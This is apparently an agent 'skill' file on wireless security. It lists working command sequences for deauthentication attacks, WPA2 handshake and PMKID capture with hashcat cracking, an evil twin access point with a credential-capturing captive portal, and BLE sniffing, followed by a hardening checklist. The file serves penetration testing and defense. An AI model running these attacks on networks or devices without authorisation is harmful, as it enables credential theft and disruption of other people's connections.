<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: wireless-security
description: >-
  Wireless security assessment including Wi-Fi penetration testing (WPA2/WPA3),
  rogue access point detection, evil twin attacks, Bluetooth/BLE exploitation,
  RFID/NFC security, wireless IDS (WIDS), 802.1X/RADIUS configuration, and
  wireless network hardening.
domain: cybersecurity
subdomain: wireless-security
tags:
  - wifi
  - wpa2
  - wpa3
  - bluetooth
  - ble
  - rfid
  - evil-twin
  - aircrack-ng
  - 802.1x
  - wireless-ids
version: "1.0"
author: defconxt
license: AGPL-3.0
compatibility: Designed for Claude Code, GitHub Copilot, OpenAI Codex, Cursor, Gemini CLI, and any agentskills.io-compatible agent.
metadata:
  mitre-attack: ["T1557.002", "T1200", "T1584.007"]
  nist-csf: ["PR.AC-5", "PR.PT-4", "DE.CM-1"]
---

# Wireless Security

## When to Use

Activate when the operator asks about Wi-Fi security testing, wireless pentesting,
rogue AP detection, Bluetooth hacking, WPA2/WPA3 attacks, 802.1X, or wireless
network hardening.

Mode: `[MODE: RED]` for wireless pentesting; `[MODE: BLUE]` for wireless IDS/hardening.

## Quick Reference

| Attack / Control | Tool / Command | Context |
|-----------------|---------------|---------|
| Monitor mode | `airmon-ng start wlan0` | Setup |
| Network discovery | `airodump-ng wlan0mon` | Recon |
| WPA2 handshake capture | `airodump-ng -c CH --bssid BSSID -w capture wlan0mon` | Offensive |
| Deauth (force handshake) | `aireplay-ng -0 5 -a BSSID wlan0mon` | Offensive |
| WPA2 crack | `hashcat -m 22000 capture.hc22000 rockyou.txt` | Offensive |
| PMKID capture | `hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng` | Offensive |
| Evil twin | `hostapd-mana /etc/hostapd/evil.conf` | Offensive |
| Rogue AP detection | `kismet -c wlan0mon` | Defensive |
| BLE scan | `hcitool lescan` / `bluetoothctl scan on` | Recon |
| 802.1X test | `eapmd5pass -r capture.pcap -w wordlist.txt` | Offensive |

## Workflow

### 1. Wi-Fi Reconnaissance

```bash
# Enable monitor mode
sudo airmon-ng check kill  # Kill interfering processes
sudo airmon-ng start wlan0

# Scan all channels
sudo airodump-ng wlan0mon

# Target specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Identify security:
# OPN = Open (no encryption)
# WEP = Wired Equivalent Privacy (trivially broken)
# WPA/WPA2-PSK = Pre-shared key (dictionary attackable)
# WPA2-Enterprise = 802.1X/RADIUS (more secure)
# WPA3-SAE = Simultaneous Authentication of Equals (strongest)
```

### 2. WPA2 Attacks

```bash
# Capture 4-way handshake
sudo airodump-ng -c 6 --bssid $BSSID -w handshake wlan0mon
# In parallel, deauth a client to force reconnection:
sudo aireplay-ng -0 3 -a $BSSID -c $CLIENT_MAC wlan0mon

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule

# PMKID attack (no client needed)
sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng \
  --filterlist_ap=$BSSID --filtermode=2
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

### 3. Evil Twin / Rogue AP

```bash
# Create evil twin with hostapd-mana
cat > evil.conf << EOF
interface=wlan1
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=captiveportal
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
EOF

# With captive portal for credential capture
# Combine with dnsmasq for DHCP + DNS redirect
# All HTTP traffic redirected to credential capture page
```

### 4. Bluetooth/BLE

```bash
# BLE device scanning
sudo hcitool lescan
# OR
sudo bluetoothctl
> scan on

# BLE GATT enumeration
gatttool -b $BLE_ADDR -I
> connect
> primary        # List services
> characteristics  # List characteristics
> char-read-hnd 0x000e  # Read value

# BLE sniffing
sudo btlejack -d $BLE_ADDR  # Sniff BLE connection

# Common BLE vulnerabilities:
# - Unencrypted GATT characteristics (read/write sensitive data)
# - No authentication required for pairing
# - Static keys / Just Works pairing
# - Firmware update over BLE without signature verification
```

### 5. Wireless Hardening

```
Hardening checklist:
├── WPA3-SAE for personal networks (WPA2 minimum with strong PSK)
├── WPA3-Enterprise (192-bit) for corporate
├── 802.1X/RADIUS with certificate-based auth (EAP-TLS)
├── Disable WPS (Wi-Fi Protected Setup)
├── MAC filtering (defense in depth only, not primary control)
├── SSID: Don't hide (breaks security), use descriptive names
├── Guest network: Isolated VLAN, client isolation, bandwidth limit
├── Wireless IDS (Kismet, Cisco CleanAir): Rogue AP detection
├── AP firmware: Keep updated, disable unused services
└── RF shielding: Limit signal leakage outside building
```

## Verification

- [ ] All wireless networks using WPA2 minimum (WPA3 preferred)
- [ ] WPS disabled on all access points
- [ ] 802.1X/RADIUS deployed for enterprise Wi-Fi
- [ ] Rogue AP detection active (WIDS/WIPS)
- [ ] Guest networks isolated on separate VLAN
- [ ] Wireless penetration test conducted annually
- [ ] Bluetooth pairing policies enforced on managed devices
